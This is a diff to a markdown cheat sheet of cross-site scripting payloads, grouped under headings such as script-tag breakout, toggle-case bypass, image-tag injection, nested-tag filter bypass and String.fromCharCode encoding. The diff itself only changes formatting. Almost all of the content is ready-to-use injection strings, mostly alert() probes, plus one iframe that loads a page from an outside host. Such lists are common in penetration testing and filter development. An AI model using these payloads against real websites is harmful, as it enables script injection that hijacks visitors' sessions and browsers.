@@ -10,7 +10,7 @@ Basic XSS codes:
     ```<script>alert(“XSS”);</script>```
 
     ```<script>alert(‘XSS’)</script>```
-
+    
    ```“><script>alert(“XSS”)</script>```
 
     ```<script>alert(/XSS”)</script>```
@@ -18,20 +18,20 @@ Basic XSS codes:
     ```<script>alert(/XSS/)</script>```
 
 When inside Script tag:
-———————————
+<p>———————————</p>
 
     ```</script><script>alert(1)</script>```
     ```‘; alert(1);```
     ```‘)alert(1);//```
 
 Bypassing with toggle case:
-————————————–
+<p>————————————–</p>
 
      ```<ScRiPt>alert(1)</sCriPt>```
       ```<IMG SRC=jAVasCrIPt:alert(‘XSS’)>```
 
 XSS in Image and HTML tags:
-———————————————
+<p>———————————————</p>
 
     ```<IMG SRC=”javascript:alert(‘XSS’);”>```
    ```<IMG SRC=javascript:alert(&quot;XSS&quot;)>```
@@ -59,7 +59,7 @@ XSS in Image and HTML tags:
    ```<iframe src=http://ha.ckers.org/scriptlet.html <```
 
 Bypass the script tag filtering:
-————————————————–
+<p>————————————————–</p>
 
     ```<<SCRIPT>alert(“XSS”);//<</SCRIPT>```
 
@@ -72,7 +72,7 @@ Bypass the script tag filtering:
     ```<scr<script>ipt>alert(1)</scr</script>ipt>```
 
 Using String.fromCharCode function:
-—————————————————–
+<p>—————————————————–</p>
 
     ```<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>```
 
